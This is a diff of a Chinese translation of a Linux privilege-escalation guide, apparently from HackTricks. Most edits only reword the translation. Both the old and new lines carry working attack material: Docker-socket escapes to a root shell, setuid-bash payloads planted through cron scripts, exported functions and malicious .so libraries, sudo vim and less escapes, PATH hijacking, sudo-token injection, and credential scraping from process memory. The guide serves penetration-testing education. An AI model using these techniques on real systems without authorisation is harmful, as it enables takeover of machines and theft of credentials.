@@ -12,9 +12,9 @@
 lsb_release -a 2>/dev/null # old, not by default on many systems
 cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
-### Path
+### 路径
 
-如果您**对`PATH`变量中的任何文件夹具有写入权限**，您可能能够劫持某些库或二进制文件：
+如果您**对`PATH`变量中任何文件夹具有写入权限**，您可能能够劫持某些库或二进制文件：
 ```bash
 echo $PATH
 ```
@@ -32,8 +32,8 @@ cat /proc/version
 uname -a
 searchsploit "Linux Kernel"
 ```
-您可以在这里找到一个好的易受攻击的内核列表和一些已经**编译的漏洞利用**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)。\
-其他可以找到一些**编译的漏洞利用**的网站： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)， [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
+您可以在这里找到一个好的易受攻击内核列表和一些已经**编译的漏洞利用**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。\
+其他可以找到一些**编译的漏洞利用**的网站：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)，[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
 要从该网站提取所有易受攻击的内核版本，您可以执行：
 ```bash
@@ -43,13 +43,13 @@ curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2
 
 [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
-[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者上执行，仅检查内核 2.x 的漏洞）
+[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者上执行，仅检查2.x内核的漏洞）
 
-始终**在 Google 中搜索内核版本**，也许您的内核版本在某个内核漏洞中被写入，这样您就可以确定该漏洞是有效的。
+始终**在Google中搜索内核版本**，也许您的内核版本在某个内核漏洞中被写入，这样您就可以确定该漏洞是有效的。
 
 ### CVE-2016-5195 (DirtyCow)
 
-Linux 权限提升 - Linux 内核 <= 3.19.0-73.8
+Linux特权提升 - Linux内核 <= 3.19.0-73.8
 ```bash
 # make dirtycow stable
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
@@ -131,7 +131,7 @@ docker-security/
 
 ## Drives
 
-检查 **已挂载和未挂载的内容**，以及挂载的位置和原因。如果有任何未挂载的内容，您可以尝试挂载它并检查私人信息。
+检查 **已挂载和未挂载的内容**，以及挂载的位置和原因。如果有任何内容未挂载，您可以尝试挂载它并检查私人信息。
 ```bash
 ls /dev 2>/dev/null | grep -i "sd"
 cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
@@ -144,13 +144,13 @@ grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
-还要检查是否**安装了任何编译器**。如果您需要使用某些内核漏洞，这很有用，因为建议在您将要使用它的机器上（或类似的机器上）进行编译。
+还要检查是否**安装了任何编译器**。如果您需要使用某个内核漏洞，这很有用，因为建议在您将要使用它的机器上（或在类似的机器上）进行编译。
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
-### 安装的易受攻击软件
+### 易受攻击的软件安装
 
-检查**已安装软件包和服务的版本**。可能存在某些旧版本的Nagios（例如），可以利用这些版本来提升权限…\
+检查**已安装软件包和服务的版本**。可能存在某些旧版的Nagios（例如），可以被利用来提升权限……\
 建议手动检查更可疑的已安装软件的版本。
 ```bash
 dpkg -l #Debian
@@ -158,18 +158,18 @@ rpm -qa #Centos
 ```
 如果您可以访问机器的SSH，您还可以使用 **openVAS** 检查机器上安装的过时和易受攻击的软件。
 
-> [!NOTE] > _请注意，这些命令将显示大量信息，这些信息大多是无用的，因此建议使用一些应用程序，如OpenVAS或类似工具，检查任何已安装的软件版本是否易受已知漏洞的攻击_
+> [!NOTE] > _请注意，这些命令将显示大量信息，其中大多数将是无用的，因此建议使用一些应用程序，如OpenVAS或类似工具，检查任何已安装的软件版本是否易受已知漏洞的攻击_
 
 ## Processes
 
-查看 **正在执行的进程**，并检查是否有任何进程具有 **超出其应有的权限**（例如，是否有由root执行的tomcat？）
+查看 **正在执行的进程**，并检查是否有任何进程 **拥有超过应有的权限**（可能是由root执行的tomcat？）
 ```bash
 ps aux
 ps -ef
 top -n 1
 ```
 始终检查可能正在运行的 [**electron/cef/chromium debuggers**，您可以利用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测这些。\
-还要**检查您对进程二进制文件的权限**，也许您可以覆盖某些内容。
+还要**检查您对进程二进制文件的权限**，也许您可以覆盖某个用户的文件。
 
 ### 进程监控
 
@@ -186,7 +186,7 @@ top -n 1
 >
 > 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
 >
-> - **kernel.yama.ptrace_scope = 0**：所有进程都可以被调试，只要它们具有相同的 uid。这是 ptracing 的经典工作方式。
+> - **kernel.yama.ptrace_scope = 0**：所有进程都可以被调试，只要它们具有相同的 uid。这是 ptracing 工作的经典方式。
 > - **kernel.yama.ptrace_scope = 1**：只有父进程可以被调试。
 > - **kernel.yama.ptrace_scope = 2**：只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。
 > - **kernel.yama.ptrace_scope = 3**：不允许使用 ptrace 跟踪任何进程。一旦设置，需要重启才能再次启用 ptracing。
@@ -237,7 +237,7 @@ strings /dev/mem -n10 | grep -i PASS
 ```
 ### ProcDump for linux
 
-ProcDump 是 Sysinternals 工具套件中经典 ProcDump 工具的 Linux 版本。获取地址在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
+ProcDump 是 Sysinternals 工具套件中经典 ProcDump 工具的 Linux 版本。可以在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
 ```
 procdump -p 1714
 
@@ -290,14 +290,14 @@ strings *.dump | grep -i password
 
 该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将 **从内存中窃取明文凭据** 和一些 **知名文件**。它需要 root 权限才能正常工作。
 
-| 特性                                           | 进程名称             |
-| ---------------------------------------------- | -------------------- |
-| GDM 密码（Kali 桌面，Debian 桌面）            | gdm-password         |
-| Gnome Keyring（Ubuntu 桌面，ArchLinux 桌面） | gnome-keyring-daemon |
-| LightDM（Ubuntu 桌面）                        | lightdm              |
-| VSFTPd（活动 FTP 连接）                       | vsftpd               |
-| Apache2（活动 HTTP 基本认证会话）             | apache2              |
-| OpenSSH（活动 SSH 会话 - Sudo 使用）          | sshd:                |
+| 特性                                             | 进程名称             |
+| ------------------------------------------------ | -------------------- |
+| GDM 密码（Kali 桌面，Debian 桌面）               | gdm-password         |
+| Gnome 密钥环（Ubuntu 桌面，ArchLinux 桌面）     | gnome-keyring-daemon |
+| LightDM（Ubuntu 桌面）                           | lightdm              |
+| VSFTPd（活动 FTP 连接）                          | vsftpd               |
+| Apache2（活动 HTTP 基本认证会话）                | apache2              |
+| OpenSSH（活动 SSH 会话 - Sudo 使用）             | sshd:                |
 
 #### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
 ```bash
@@ -325,7 +325,7 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 
 例如，在 _/etc/crontab_ 中可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
 
-(_注意用户 "user" 对 /home/user 具有写入权限_)
+(_注意用户 "user" 对 /home/user 具有写权限_)
 
 如果在这个 crontab 中，root 用户尝试执行某个命令或脚本而没有设置路径。例如: _\* \* \* \* root overwrite.sh_\
 然后，您可以通过使用：
@@ -356,15 +356,15 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-如果由 root 执行的脚本使用一个 **您拥有完全访问权限的目录**，那么删除该文件夹并 **创建一个指向另一个文件夹的符号链接**，该文件夹中包含您控制的脚本，可能会很有用。
+如果由 root 执行的脚本使用一个 **您拥有完全访问权限的目录**，那么删除该文件夹并 **创建一个指向另一个由您控制的脚本的符号链接文件夹** 可能会很有用。
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
 ### Frequent cron jobs
 
-您可以监控进程以搜索每 1、2 或 5 分钟执行的进程。也许您可以利用它来提升权限。
+您可以监控进程，以搜索每 1、2 或 5 分钟执行的进程。也许您可以利用这一点来提升权限。
 
-例如，要**每 0.1 秒监控 1 分钟**，**按执行次数较少的命令排序**并删除执行次数最多的命令，您可以这样做：
+例如，要**每 0.1 秒监控 1 分钟**，**按执行次数较少的命令排序**并删除执行次数最多的命令，您可以执行：
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
@@ -372,7 +372,7 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 ### 隐形的 cron 作业
 
-可以创建一个 cron 作业 **在注释后放置回车符**（没有换行符），并且 cron 作业将正常工作。示例（注意回车字符）：
+可以创建一个 cron 作业 **在注释后放置一个回车符**（没有换行符），并且 cron 作业将正常工作。示例（注意回车符）：
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
@@ -385,7 +385,7 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 ### 可写的服务二进制文件
 
-请记住，如果您对服务执行的二进制文件具有 **写权限**，您可以将它们更改为后门，这样当服务重新执行时，后门将被执行。
+请记住，如果您对由服务执行的二进制文件具有 **写权限**，您可以将它们更改为后门，这样当服务重新执行时，后门将被执行。
 
 ### systemd PATH - 相对路径
 
@@ -401,7 +401,7 @@ ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
 然后，在您可以写入的 systemd PATH 文件夹中创建一个 **可执行文件**，其 **名称与相对路径二进制文件相同**，当服务被要求执行脆弱操作（**启动**，**停止**，**重新加载**）时，您的 **后门将被执行**（普通用户通常无法启动/停止服务，但请检查您是否可以使用 `sudo -l`）。
 
-**了解有关服务的更多信息，请使用 `man systemd.service`。**
+**了解有关服务的更多信息，请参见 `man systemd.service`。**
 
 ## **定时器**
 
@@ -417,14 +417,14 @@ systemctl list-timers --all
 ```bash
 Unit=backdoor.service
 ```
-在文档中，您可以阅读单位的定义：
+在文档中，您可以阅读到单位的定义：
 
-> 当此计时器到期时要激活的单位。参数是单位名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器单位同名的服务，后缀除外。（见上文。）建议激活的单位名称和计时器单位的名称在后缀之外是相同的。
+> 当此计时器到期时要激活的单位。参数是单位名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器单位同名的服务，除了后缀外。（见上文。）建议激活的单位名称和计时器单位的名称在后缀之外是相同的。
 
 因此，要滥用此权限，您需要：
 
 - 找到某个 systemd 单元（如 `.service`），该单元正在 **执行一个可写的二进制文件**
-- 找到某个 systemd 单元，该单元正在 **执行一个相对路径**，并且您对 **systemd PATH** 具有 **可写权限**（以伪装该可执行文件）
+- 找到某个 systemd 单元，该单元正在 **执行一个相对路径**，并且您对 **systemd PATH** 具有 **可写权限**（以冒充该可执行文件）
 
 **了解有关计时器的更多信息，请使用 `man systemd.timer`。**
 
@@ -439,17 +439,17 @@ Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /li
 
 ## Sockets
 
-Unix 域套接字 (UDS) 使得 **进程通信** 在同一台或不同机器之间的客户端-服务器模型中成为可能。它们利用标准的 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行设置。
+Unix 域套接字 (UDS) 使得在客户端-服务器模型中同一台或不同机器上的 **进程通信** 成为可能。它们利用标准的 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行设置。
 
 可以使用 `.socket` 文件配置套接字。
 
 **通过 `man systemd.socket` 了解更多关于套接字的信息。** 在此文件中，可以配置几个有趣的参数：
 
 - `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项不同，但总结用于 **指示它将监听的位置**（AF_UNIX 套接字文件的路径，监听的 IPv4/6 和/或端口号等）
-- `Accept`: 接受一个布尔参数。如果 **true**，则 **为每个传入连接生成一个服务实例**，并且仅将连接套接字传递给它。如果 **false**，则所有监听套接字本身都被 **传递给启动的服务单元**，并且仅为所有连接生成一个服务单元。对于数据报套接字和 FIFO，此值被忽略，因为单个服务单元无条件处理所有传入流量。**默认为 false**。出于性能原因，建议仅以适合 `Accept=no` 的方式编写新守护进程。
-- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，这些命令在监听 **套接字**/FIFO 被 **创建** 和绑定之前或之后 **执行**。命令行的第一个标记必须是绝对文件名，后面跟随进程的参数。
-- `ExecStopPre`, `ExecStopPost`: 在监听 **套接字**/FIFO 被 **关闭** 和移除之前或之后 **执行** 的附加 **命令**。
-- `Service`: 指定 **在传入流量上激活的** 服务单元名称。此设置仅允许用于 Accept=no 的套接字。默认为与套接字同名的服务（后缀被替换）。在大多数情况下，不需要使用此选项。
+- `Accept`: 接受一个布尔参数。如果 **true**，则为每个传入连接 **生成一个服务实例**，并且仅将连接套接字传递给它。如果 **false**，则所有监听套接字本身 **传递给启动的服务单元**，并且仅为所有连接生成一个服务单元。对于数据报套接字和 FIFO，此值被忽略，单个服务单元无条件处理所有传入流量。**默认为 false**。出于性能原因，建议仅以适合 `Accept=no` 的方式编写新守护进程。
+- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，这些命令在监听 **套接字**/FIFO 被 **创建** 和绑定之前或之后 **执行**。命令行的第一个标记必须是绝对文件名，后面跟着进程的参数。
+- `ExecStopPre`, `ExecStopPost`: 在监听 **套接字**/FIFO 被 **关闭** 和移除之前或之后 **执行** 的额外 **命令**。
+- `Service`: 指定 **在传入流量** 上 **激活** 的 **服务** 单元名称。此设置仅允许用于 Accept=no 的套接字。默认为与套接字同名的服务（后缀被替换）。在大多数情况下，不需要使用此选项。
 
 ### 可写的 .socket 文件
 
@@ -481,7 +481,7 @@ socket-command-injection.md
 
 ### HTTP 套接字
 
-请注意，可能有一些 **监听 HTTP** 请求的 **套接字**（_我不是在谈论 .socket 文件，而是作为 unix 套接字的文件_）。您可以通过以下方式检查：
+请注意，可能有一些 **监听 HTTP** 请求的 **套接字**（_我不是在谈论 .socket 文件，而是充当 unix 套接字的文件_）。您可以通过以下方式检查：
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
@@ -489,11 +489,11 @@ curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 
 ### 可写的 Docker 套接字
 
-Docker 套接字，通常位于 `/var/run/docker.sock`，是一个关键文件，应该被保护。默认情况下，它对 `root` 用户和 `docker` 组的成员是可写的。拥有对这个套接字的写入权限可能导致权限提升。以下是如何做到这一点的分解，以及在 Docker CLI 不可用时的替代方法。
+Docker 套接字，通常位于 `/var/run/docker.sock`，是一个关键文件，应该被保护。默认情况下，它对 `root` 用户和 `docker` 组的成员是可写的。拥有对这个套接字的写入权限可能导致特权升级。以下是如何做到这一点的分解，以及在 Docker CLI 不可用时的替代方法。
 
-#### **使用 Docker CLI 提升权限**
+#### **使用 Docker CLI 进行特权升级**
 
-如果你对 Docker 套接字具有写入权限，你可以使用以下命令提升权限：
+如果你对 Docker 套接字具有写入权限，可以使用以下命令进行特权升级：
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
@@ -532,13 +532,13 @@ Connection: Upgrade
 Upgrade: tcp
 ```
 
-在设置好 `socat` 连接后，您可以直接在容器中以根级别访问主机的文件系统执行命令。
+在设置好 `socat` 连接后，您可以直接在容器中执行命令，拥有对主机文件系统的根级别访问权限。
 
 ### 其他
 
 请注意，如果您对 Docker 套接字具有写权限，因为您**在 `docker` 组内**，您有[**更多的权限提升方式**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 在某个端口上监听**，您也可能能够妥协它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。
 
-查看**更多从 Docker 中突破或滥用它以提升权限的方法**在：
+查看**更多从 Docker 中突破或滥用它以提升权限的方法**：
 
 {{#ref}}
 docker-security/
@@ -568,7 +568,7 @@ D-Bus 是一个复杂的 **进程间通信 (IPC) 系统**，使应用程序能�
 
 D-Bus 基于 **允许/拒绝模型**，根据匹配策略规则的累积效果管理消息权限（方法调用、信号发射等）。这些策略指定与总线的交互，可能通过利用这些权限来允许权限提升。
 
-在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了这样一个策略的示例，详细说明了根用户拥有、发送和接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。
+在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了一个此类策略的示例，详细说明了根用户拥有、发送和接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。
 
 没有指定用户或组的策略适用于所有情况，而“默认”上下文策略适用于所有未被其他特定策略覆盖的情况。
 ```xml
@@ -579,7 +579,7 @@ D-Bus 基于 **允许/拒绝模型**，根据匹配策略规则的累积效果�
 <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
 </policy>
 ```
-**了解如何枚举和利用 D-Bus 通信：**
+**学习如何枚举和利用 D-Bus 通信：**
 
 {{#ref}}
 d-bus-enumeration-and-command-injection-privilege-escalation.md
@@ -629,7 +629,7 @@ timeout 1 tcpdump
 
 ### 通用枚举
 
-检查 **你是谁**，你拥有的 **权限**，系统中有哪些 **用户**，哪些可以 **登录**，哪些具有 **root 权限**：
+检查 **who** 你是，您拥有的 **privileges**，系统中有哪些 **users**，哪些可以 **login**，哪些具有 **root privileges**：
 ```bash
 #Info about me
 id || (whoami && groups) 2>/dev/null
@@ -653,7 +653,7 @@ gpg --list-keys 2>/dev/null
 ```
 ### Big UID
 
-某些Linux版本受到一个漏洞的影响，该漏洞允许**UID > INT_MAX**的用户提升权限。更多信息：[here](https://gitlab.freedesktop.org/polkit/polkit/issues/74)，[here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)和[here](https://twitter.com/paragonsec/status/1071152249529884674)。\
+某些Linux版本受到一个漏洞的影响，该漏洞允许**UID > INT_MAX**的用户提升权限。更多信息：[here](https://gitlab.freedesktop.org/polkit/polkit/issues/74)，[here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和 [here](https://twitter.com/paragonsec/status/1071152249529884674)。\
 **利用它**使用：**`systemd-run -t /bin/bash`**
 
 ### Groups
@@ -687,18 +687,18 @@ grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/logi
 
 ### Su Brute
 
-如果您不介意制造大量噪音，并且计算机上存在`su`和`timeout`二进制文件，您可以尝试使用[su-bruteforce](https://github.com/carlospolop/su-bruteforce)进行暴力破解用户。\
+如果您不介意制造很多噪音，并且计算机上存在`su`和`timeout`二进制文件，您可以尝试使用[su-bruteforce](https://github.com/carlospolop/su-bruteforce)进行暴力破解用户。\
 [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)使用`-a`参数也会尝试暴力破解用户。
 
 ## 可写的 PATH 滥用
 
 ### $PATH
 
-如果您发现可以**在 $PATH 的某个文件夹内写入**，您可能能够通过**在可写文件夹内创建一个后门**，其名称为将由其他用户（理想情况下是 root）执行的某个命令，并且该命令**不是从位于您可写文件夹之前的文件夹加载**的，从而提升权限。
+如果您发现可以**在$PATH的某个文件夹内写入**，您可能能够通过**在可写文件夹内创建一个后门**，其名称为将由其他用户（理想情况下是root）执行的某个命令，并且该命令**不是从位于$PATH中您可写文件夹之前的文件夹加载的**，来提升权限。
 
 ### SUDO 和 SUID
 
-您可能被允许使用 sudo 执行某些命令，或者它们可能具有 suid 位。使用以下命令检查：
+您可能被允许使用sudo执行某些命令，或者它们可能具有suid位。使用以下命令检查：
 ```bash
 sudo -l #Check commands you can execute with sudo
 find / -perm -4000 2>/dev/null #Find all SUID binaries
@@ -720,13 +720,13 @@ $ sudo -l
 User demo may run the following commands on crashlab:
 (root) NOPASSWD: /usr/bin/vim
 ```
-在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh 密钥添加到根目录或调用 `sh` 来获取 shell 变得很简单。
+在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh 密钥添加到根目录或调用 `sh` 来获取 shell 变得非常简单。
 ```
 sudo vim -c '!sh'
 ```
 ### SETENV
 
-此指令允许用户在执行某个操作时**设置环境变量**：
+此指令允许用户在执行某些操作时**设置环境变量**：
 ```bash
 $ sudo -l
 User waldo may run the following commands on admirer:
@@ -738,7 +738,7 @@ sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
 ### Sudo 执行绕过路径
 
-**跳转** 以读取其他文件或使用 **符号链接**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
+**跳转** 以读取其他文件或使用 **符号链接**。例如在 sudoers 文件中: _hacker10 ALL= (root) /bin/less /var/log/\*_
 ```bash
 sudo less /var/logs/anything
 less>:e /etc/shadow #Jump to read other files using privileged less
@@ -755,23 +755,23 @@ sudo less /var/log/something /etc/shadow #Red 2 files
 ```
 **对策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
 
-### Sudo命令/SUID二进制文件没有命令路径
+### 没有命令路径的 Sudo 命令/SUID 二进制文件
 
-如果**sudo权限**被授予单个命令**而不指定路径**: _hacker10 ALL= (root) less_，你可以通过更改PATH变量来利用它。
+如果 **sudo 权限** 被授予单个命令 **而未指定路径**: _hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它。
 ```bash
 export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
 sudo less
 ```
-这种技术也可以在**suid**二进制文件**执行另一个命令而不指定路径时使用（始终检查**_**strings**_ **工具查看奇怪的 SUID 二进制文件的内容）**。
+这种技术也可以在**suid**二进制文件**执行另一个命令而不指定路径时使用（始终检查**_**strings**_**工具查看奇怪的SUID二进制文件的内容）**。
 
-[Payload examples to execute.](payloads-to-execute.md)
+[执行的有效载荷示例。](payloads-to-execute.md)
 
-### 带命令路径的 SUID 二进制文件
+### 带命令路径的SUID二进制文件
 
-如果**suid**二进制文件**执行另一个命令并指定路径**，那么你可以尝试**导出一个名为**该 suid 文件调用的命令的函数。
+如果**suid**二进制文件**执行另一个命令并指定路径**，那么你可以尝试**导出一个名为该suid文件调用的命令的函数**。
 
-例如，如果一个 suid 二进制文件调用_**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
+例如，如果一个suid二进制文件调用_**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
@@ -836,13 +836,13 @@ sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
 ### SUID 二进制文件 – .so 注入
 
-当遇到一个具有 **SUID** 权限的二进制文件且看起来不寻常时，验证它是否正确加载 **.so** 文件是一个好习惯。可以通过运行以下命令来检查：
+当遇到一个具有 **SUID** 权限且看起来不寻常的二进制文件时，验证它是否正确加载 **.so** 文件是一个好习惯。可以通过运行以下命令来检查：
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
-例如，遇到错误 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (没有这样的文件或目录)"_ 表明存在利用的潜力。
+例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (没有这样的文件或目录)"_ 的错误提示了潜在的利用可能性。
 
-要利用这一点，可以通过创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
+为了利用这一点，可以创建一个 C 文件，比如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -853,13 +853,13 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-此代码在编译和执行后，旨在通过操纵文件权限并以提升的权限执行一个 shell 来提升特权。
+此代码在编译和执行后，旨在通过操纵文件权限并执行具有提升权限的 shell 来提升权限。
 
 使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
-最终，运行受影响的 SUID 二进制文件应该会触发漏洞，从而可能导致系统被攻陷。
+最后，运行受影响的 SUID 二进制文件应该会触发漏洞，从而可能导致系统被攻陷。
 
 ## 共享对象劫持
 ```bash
@@ -884,7 +884,7 @@ setresuid(0,0,0);
 system("/bin/bash -p");
 }
 ```
-如果您遇到错误，例如
+如果您遇到类似的错误
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
@@ -892,7 +892,7 @@ system("/bin/bash -p");
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) 是一个经过整理的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 则是针对只能 **注入参数** 的命令的相同列表。
+[**GTFOBins**](https://gtfobins.github.io) 是一个经过整理的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 则是针对只能 **注入参数** 的命令的情况。
 
 该项目收集了可以被滥用的 Unix 二进制文件的合法功能，以突破受限的 shell，提升或维持提升的权限，传输文件，生成绑定和反向 shell，并促进其他后期利用任务。
 
@@ -920,21 +920,21 @@ https://gtfoargs.github.io/
 提升权限的要求：
 
 - 您已经以用户 "_sampleuser_" 拥有一个 shell
-- "_sampleuser_" 在 **过去 15 分钟内** **使用过 `sudo`** 执行了某些操作（默认情况下，这是允许我们使用 `sudo` 而不输入任何密码的 sudo 令牌的持续时间）
-- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
+- "_sampleuser_" 在 **过去 15 分钟内** **使用过 `sudo`** 执行了某些操作（默认情况下，这是允许我们在不输入任何密码的情况下使用 `sudo` 的 sudo 令牌的持续时间）
+- `cat /proc/sys/kernel/yama/ptrace_scope` 为 0
 - `gdb` 可访问（您可以上传它）
 
-（您可以通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或通过永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来实现）
+（您可以通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或通过永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0`）
 
 如果满足所有这些要求，**您可以使用以下方法提升权限：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
 
-- **第一个利用** (`exploit.sh`) 将在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。您可以使用它来 **激活您会话中的 sudo 令牌**（您不会自动获得 root shell，请执行 `sudo su`）：
+- **第一个利用** (`exploit.sh`) 将在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。您可以使用它来 **在您的会话中激活 sudo 令牌**（您不会自动获得 root shell，请执行 `sudo su`）：
 ```bash
 bash exploit.sh
 /tmp/activate_sudo_token
 sudo su
 ```
-- 第二个漏洞 (`exploit_v2.sh`) 将在 _/tmp_ 创建一个 **由 root 拥有并设置了 setuid 的 sh shell**
+- 第二个漏洞 (`exploit_v2.sh`) 将在 _/tmp_ 中创建一个 **由 root 拥有并设置了 setuid 的 sh shell**
 ```bash
 bash exploit_v2.sh
 /tmp/sh -p
@@ -946,8 +946,8 @@ sudo su
 ```
 ### /var/run/sudo/ts/\<Username>
 
